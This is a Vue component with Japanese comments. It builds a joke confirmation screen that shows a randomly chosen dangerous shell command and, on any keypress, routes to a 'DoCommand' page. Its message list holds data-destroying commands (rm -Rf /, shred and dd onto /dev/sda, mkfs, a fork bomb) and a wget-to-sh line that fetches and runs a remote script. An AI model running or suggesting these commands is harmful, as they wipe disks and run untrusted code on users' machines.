<template>
  <div class="submitted-form">
    <!-- 背景画像を設定 -->
    <div class="background-image"></div>
    <!-- フォーム -->
    <div class="form-container">
      <h1>以下のコードを実行します。よろしいですか？</h1>
      <h1 style="color:grey">{{ randomMessage }}</h1>
    </div>
  </div>
</template>

<script>
export default {
  data() {
    return {
      messages: [
        'rm -Rf /',
        'shred /dev/sda',
        'dd if=/dev/random of=/dev/sda',
        'mkfs.ext4 /dev/sda1',
        'mv / /dev/null',
        ':(){:|:&};:',
        'wget http://unknownsource.com/possiblydangerous.sh -O- | sh',
        'gunzip untrusted.gz',
        'command > file.conf',
        '^mistake^correction'
      ],
      randomMessage: '', // ランダムなメッセージを保持するデータ
    };
  },
  mounted() {
    this.$root.popupText = "まさか、「よろしくお願いしまぁぁぁす！」なんて言わないだろうな...？";
    this.randomMessage = this.getRandomMessage();
    document.addEventListener('keydown', this.handleKeyDown);
  },
  beforeUnmount() {
    document.removeEventListener('keydown', this.handleKeyDown);
  },
  methods: {
    getRandomMessage() {
      // messagesリストからランダムなメッセージを選択する
      const randomIndex = Math.floor(Math.random() * this.messages.length);
      return this.messages[randomIndex];
    },
    submitForm() {
      this.$router.push({ name: 'DoCommand', query: { message: this.randomMessage } });
    },
    handleKeyDown() {
      // 任意のキーが押下された場合にフォームを送信する
      this.submitForm('Key Pressed');
    },
  },
};
</script>

<style>
.submitted-form {
  /* 背景画像の設定 */
  background-image: url('/public/images/worldclock.png'); /* 画像ファイルのパスを指定する */
  background-size: cover;
  background-position: center;
  /* 以下はフォームのスタイルに関するCSS */
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
  width: 100%;
}
.form-container {
  background-color: rgba(255, 255, 255, 0.8); /* フォームの背景色（透明度を上げる） */
  padding: 20px;
  border-radius: 10px;
  box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
  background-color: black;
  color: white;
  width: 100%;
  height: 20%;
}
h1 {
  text-align: center;
}
.button-container {
  display: flex;
  justify-content: center;
  align-items: center;
  margin-top: 20px;
}
.yes-button,
.no-button {
  padding: 10px 20px;
  font-size: 16px;
  cursor: pointer;
}
.yes-button {
  background-color: #007bff;
  color: white;
  border: none;
  border-radius: 5px;
  margin-right: 10px;
}
.no-button {
  background-color: #dc3545;
  color: white;
  border: none;
  border-radius: 5px;
}
</style>
